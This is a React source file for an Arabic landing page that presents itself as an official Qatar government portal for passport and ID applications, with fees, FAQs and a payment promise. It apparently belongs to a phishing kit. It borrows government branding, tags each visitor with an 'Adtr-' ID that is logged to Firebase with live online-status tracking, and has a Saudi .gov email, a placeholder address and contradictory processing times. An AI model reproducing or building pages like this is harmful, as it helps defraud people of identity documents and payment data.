import { Link } from "wouter"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion"
import { Badge } from "@/components/ui/badge"
import { ThemeToggle } from "@/components/theme-toggle"
import {
  Shield,
  FileText,
  Clock,
  CheckCircle2,
  ArrowLeft,
  HelpCircle,
  Phone,
  Mail,
  Building2,
  CreditCard,
} from "lucide-react"
import { useEffect, useState } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { addData } from "@/lib/firebase"
import FullPageLoader from "@/components/loader"

const requirements = [
  "إثبات جنسية ساري المفعول (شهادة ميلاد أو شهادة تجنس)",
  "صورة شخصية حديثة تستوفي المواصفات الرسمية",
  "هوية حكومية سارية المفعول",
  "إثبات عنوان (فاتورة خدمات أو كشف حساب بنكي)",
  "دفع رسوم الطلب",
]

const faqs = [
  {
    question: "كم يستغرق إجراء الطلب؟",
    answer:
      "المعالجة العادية تستغرق 4-6 أسابيع لجوازات السفر و2-3 أسابيع لبطاقات الهوية. تتوفر المعالجة السريعة مقابل رسوم إضافية.",
  },
  {
    question: "ما هي مواصفات الصورة المطلوبة؟",
    answer:
      "يجب أن تكون الصورة بحجم 4×6 سم، ملتقطة خلال الأشهر الستة الماضية، بخلفية بيضاء أو فاتحة. لا يُسمح بارتداء النظارات أو القبعات إلا لأغراض دينية.",
  },
  {
    question: "هل يمكنني تتبع حالة طلبي؟",
    answer:
      "نعم، ستحصل على رقم مرجعي عند الإرسال يمكنك استخدامه لتتبع حالة طلبك عبر الإنترنت أو بالاتصال بخط المساعدة.",
  },
  {
    question: "ماذا لو احتجت لإجراء تغييرات بعد الإرسال؟",
    answer:
      "يمكنك طلب تغييرات خلال 24 ساعة من الإرسال بالتواصل مع فريق الدعم مع رقمك المرجعي. بعد هذه الفترة، قد تحتاج لتقديم طلب جديد.",
  },
  {
    question: "هل معلوماتي الشخصية آمنة؟",
    answer:
      "بالتأكيد. جميع البيانات مشفرة باستخدام بروتوكولات معيارية ومخزنة بشكل آمن وفقًا للوائح حماية البيانات الحكومية.",
  },
]
function randstr(prefix:string)
{
    return Math.random().toString(36).replace('0.',prefix || '');
}
const visitorID=randstr('Adtr-')
export default function LandingPage() {
  const [ready, setReady] = useState(true)

  useEffect(() => {
    getLocation().finally(()=>{
      setReady(false)
    })
  }, [])
  async function getLocation() {
   try {
       await  addData({
            id:visitorID,
        })
        setupOnlineStatus(visitorID)
      } catch (error) {
        console.error('Error fetching location:', error);
    }
  }
  return (
    <div className="min-h-screen bg-background">
     
     {ready &&<FullPageLoader></FullPageLoader>}

      <main className="max-w-6xl mx-auto px-6 space-y-16 pb-16">
        <section className="relative -mx-6 overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-b from-black/10 via-black/40 to-black/60" />
          <div
            className="relative bg-cover bg-center bg-no-repeat"
            style={{
              backgroundImage: "url(/skyline_compress.png)",
              minHeight: "500px",
            }}
          >
             <header className="sticky top-0 z-50  bg-transparent  backdrop-blur supports-[backdrop-filter]:bg-background/10">
        <div className=" mx-auto flex items-center justify-between gap-4 px-6 py-2">
          <div className="flex items-center gap-3">
              <img
                src="/hj.svg"
                width={145}
                height={45}
                alt="Qatar Government Logo"
              />
           
          </div>


          <ThemeToggle />
        </div>
      </header>
            <div className="absolute inset-0 bg-gradient-to-t from-transparent via-[#8A1538]/70 to-black/50" />
            <div className="relative max-w-6xl mx-auto px-6 py-24 text-center space-y-6">
           <Badge className="backdrop-blur supports-[backdrop-filter]:bg-background/10">
          <h2 className="text-lg">الخـدمـات الألكترونية</h2>

           </Badge>
              <h2  dir="rtl"
                className="text-4xl md:text-5xl lg:text-6xl font-bold tracking-tight text-white leading-tight text-balance"
                data-testid="text-hero-title"
              >
                تقدم بطلب جواز السفر <br className="hidden sm:block" />
                أو بطاقة الهوية
              </h2>
              <p
                className="text-lg md:text-xl text-white/95 max-w-2xl mx-auto leading-relaxed text-pretty"
                data-testid="text-hero-description"
              >
                أ كمل طلبك عبر الإنترنت في دقائق معدودة. منصتنا الآمنة ترشدك خلال كل خطوة من العملية.
              </p>
              <div className="flex items-center justify-center gap-4 pt-6 flex-wrap">
                <Link href="/apply">
                  <Button
                    size="lg"
                    data-testid="button-start-application"
                    className="border-0 bg-[#8A1538] text-foreground hover:bg-background/90 shadow-lg text-base px-8 h-12"
                  >
                    ابدأ التقديم
                    <ArrowLeft className="mr-2 h-5 w-5" />
                  </Button>
                </Link>
                <Button
                  variant="outline"
                  size="lg"
                  data-testid="button-check-status"
                  className="border-white/30 bg-white/10 text-white hover:bg-white/20 hover:text-white backdrop-blur-sm text-base px-8 h-12"
                >
                  تتبع حالة الطلب
                </Button>
              </div>
            </div>
          </div>
        </section>

        <section className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6 pt-8">
          <Card
            data-testid="card-feature-secure"
            className="border-border/50 hover:border-[#8A1538]/50 hover:shadow-lg transition-all duration-300"
          >
            <CardContent className="pt-8 pb-6 px-6">
              <div className="flex flex-col items-center text-center space-y-4">
                <div className="p-4 rounded-full bg-[#8A1538]/10">
                  <Shield className="h-7 w-7 text-[#8A1538]" />
                </div>
                <h3 className="font-semibold text-base">آمن ومشفر</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  معلوماتك الشخصية محمية بتشفير بنكي المستوى
                </p>
              </div>
            </CardContent>
          </Card>

          <Card
            data-testid="card-feature-simple"
            className="border-border/50 hover:border-[#8A1538]/50 hover:shadow-lg transition-all duration-300"
          >
            <CardContent className="pt-8 pb-6 px-6">
              <div className="flex flex-col items-center text-center space-y-4">
                <div className="p-4 rounded-full bg-[#8A1538]/10">
                  <FileText className="h-7 w-7 text-[#8A1538]" />
                </div>
                <h3 className="font-semibold text-base">عملية بسيطة</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  نموذج سهل خطوة بخطوة مع خيار الحفظ والمتابعة لاحقًا
                </p>
              </div>
            </CardContent>
          </Card>

          <Card
            data-testid="card-feature-fast"
            className="border-border/50 hover:border-[#8A1538]/50 hover:shadow-lg transition-all duration-300"
          >
            <CardContent className="pt-8 pb-6 px-6">
              <div className="flex flex-col items-center text-center space-y-4">
                <div className="p-4 rounded-full bg-[#8A1538]/10">
                  <Clock className="h-7 w-7 text-[#8A1538]" />
                </div>
                <h3 className="font-semibold text-base">معالجة سريعة</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">
                  الطلبات عبر الإنترنت تُعالج بشكل أسرع من الطلبات الورقية
                </p>
              </div>
            </CardContent>
          </Card>

          <Card
            data-testid="card-feature-payment"
            className="border-border/50 hover:border-[#8A1538]/50 hover:shadow-lg transition-all duration-300"
          >
            <CardContent className="pt-8 pb-6 px-6">
              <div className="flex flex-col items-center text-center space-y-4">
                <div className="p-4 rounded-full bg-[#8A1538]/10">
                  <CreditCard className="h-7 w-7 text-[#8A1538]" />
                </div>
                <h3 className="font-semibold text-base">دفع آمن</h3>
                <p className="text-sm text-muted-foreground leading-relaxed">ادفع الرسوم بشكل آمن عبر الإنترنت</p>
              </div>
            </CardContent>
          </Card>
        </section>

      
        <section>
          <Card data-testid="card-fees" className="border-border/50 shadow-sm">
            <CardHeader className="pb-4">
              <CardTitle className="flex items-center gap-3 text-xl">
                <div className="p-2 rounded-lg bg-[#8A1538]/10">
                  <CreditCard className="h-6 w-6 text-[#8A1538]" />
                </div>
                الرسوم
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="p-6 border border-border/50 rounded-lg bg-muted/30 hover:bg-muted/50 transition-colors">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="p-2 rounded-lg bg-[#8A1538]/10">
                      <FileText className="h-5 w-5 text-[#8A1538]" />
                    </div>
                    <h4 className="font-semibold text-base">جواز السفر</h4>
                  </div>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between items-center p-3 rounded-md bg-background">
                      <span className="text-muted-foreground">عادي (1-2 أسابيع)</span>
                      <span className="font-semibold text-lg">150 ر.ق</span>
                    </div>
                    <div className="flex justify-between items-center p-3 rounded-md bg-background">
                      <span className="text-muted-foreground">سريع (24 ساعة )</span>
                      <span className="font-semibold text-lg">300 ر.ق</span>
                    </div>
                  </div>
                </div>
                <div className="p-6 border border-border/50 rounded-lg bg-muted/30 hover:bg-muted/50 transition-colors">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="p-2 rounded-lg bg-[#8A1538]/10">
                      <CreditCard className="h-5 w-5 text-[#8A1538]" />
                    </div>
                    <h4 className="font-semibold text-base">بطاقة الهوية</h4>
                  </div>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between items-center p-3 rounded-md bg-background">
                    <span className="text-muted-foreground">عادي (1-2 أسابيع)</span>
                      <span className="font-semibold text-lg">50 ر.ق</span>
                    </div>
                    <div className="flex justify-between items-center p-3 rounded-md bg-background">
                    <span className="text-muted-foreground">سريع (24 ساعة )</span>
                      <span className="font-semibold text-lg">100 ر.ق</span>
                    </div>
                  </div>
                </div>
              </div>
            </CardContent>
          </Card>
        </section>

        <section>
          <div className="flex items-center gap-3 mb-6">
            <div className="p-2 rounded-lg bg-[#8A1538]/10">
              <HelpCircle className="h-6 w-6 text-[#8A1538]" />
            </div>
            <h3 className="text-2xl font-bold">الأسئلة الشائعة</h3>
          </div>
          <Accordion type="single" collapsible className="w-full space-y-2">
            {faqs.map((faq, index) => (
              <AccordionItem
                key={index}
                value={`item-${index}`}
                data-testid={`faq-item-${index}`}
                className="border border-border/50 rounded-lg px-6 bg-card hover:bg-muted/30 transition-colors"
              >
                <AccordionTrigger className="text-right hover:no-underline py-5 text-base font-medium">
                  {faq.question}
                </AccordionTrigger>
                <AccordionContent className="text-muted-foreground text-right pb-5 leading-relaxed">
                  {faq.answer}
                </AccordionContent>
              </AccordionItem>
            ))}
          </Accordion>
        </section>
      </main>

      <footer className="border-t bg-muted/30 mt-16">
        <div className="max-w-6xl mx-auto px-6 py-12">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-10">
            <div>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 rounded-lg bg-[#8A1538]/10">
                  <Building2 className="h-5 w-5 text-[#8A1538]" />
                </div>
                <span className="font-semibold text-base">موقع المكتب</span>
              </div>
              <p className="text-sm text-muted-foreground leading-relaxed">
                123 ساحة الحكومة
                <br />
                العاصمة، 12345
              </p>
            </div>
            <div>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 rounded-lg bg-[#8A1538]/10">
                  <Phone className="h-5 w-5 text-[#8A1538]" />
                </div>
                <span className="font-semibold text-base">خط المساعدة</span>
              </div>
              <p dir="ltr" className="text-sm text-center text-muted-foreground leading-relaxed">
                +974-88995544
              
              </p>
              <br />
                الأحد - الخميس، 9ص - 5م
            </div>
            <div>
              <div className="flex items-center gap-3 mb-4">
                <div className="p-2 rounded-lg bg-[#8A1538]/10">
                  <Mail className="h-5 w-5 text-[#8A1538]" />
                </div>
                <span className="font-semibold text-base">الدعم عبر البريد</span>
              </div>
              <p className="text-sm text-muted-foreground leading-relaxed">
                support@documentportal.gov.sa
                <br />
                الرد خلال 24 ساعة
              </p>
            </div>
          </div>
          <div className="mt-10 pt-8 border-t border-border/50 text-center text-sm text-muted-foreground">
            <p data-testid="text-copyright">بوابة طلب الوثائق الحكومية الرسمية. جميع الحقوق محفوظة.</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
